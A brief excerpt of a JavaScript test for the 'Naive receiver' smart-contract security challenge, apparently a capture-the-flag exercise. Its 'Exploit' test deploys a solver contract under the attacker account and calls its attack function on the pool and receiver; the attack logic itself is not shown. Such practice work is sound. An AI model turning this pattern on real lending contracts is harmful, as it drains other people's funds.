...
describe("[Challenge] Naive receiver", function () {
    ...
    it("Exploit", async function () {
        ...
        const NaiveReceiverSolverFactory = await ethers.getContractFactory("NaiveReceiverSolver", attacker)
        const solver = await NaiveReceiverSolverFactory.deploy()
        await solver.attack(this.pool.address, this.receiver.address)
    })
